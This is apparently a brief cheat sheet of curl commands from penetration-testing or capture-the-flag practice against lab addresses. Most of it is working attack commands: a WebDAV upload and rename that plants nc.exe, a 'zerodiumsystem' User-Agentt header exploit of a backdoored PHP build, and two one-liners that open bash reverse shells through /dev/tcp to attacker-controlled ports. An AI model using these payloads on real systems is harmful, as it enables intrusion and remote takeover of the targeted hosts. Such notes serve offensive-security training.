Move a file with curl:
```
curl -X MOVE --header "Destination:http://10.10.10.15/nc.exe" http://10.10.10.15/nc.txt
```

Upload a file with curl:
```
curl http://10.10.10.15/ --upload-file shell.txt
```
sends a reverse shell.
```
curl http://10.10.10.242/index.php -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i
&>/dev/tcp/10.10.14.177/1234 0>&1 '\");"
```

Get an Http header:
```
curl -I <http://ip-address/
```
Get a reverse shell with curl:
```
curl 10.10.11.116/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1'"
```
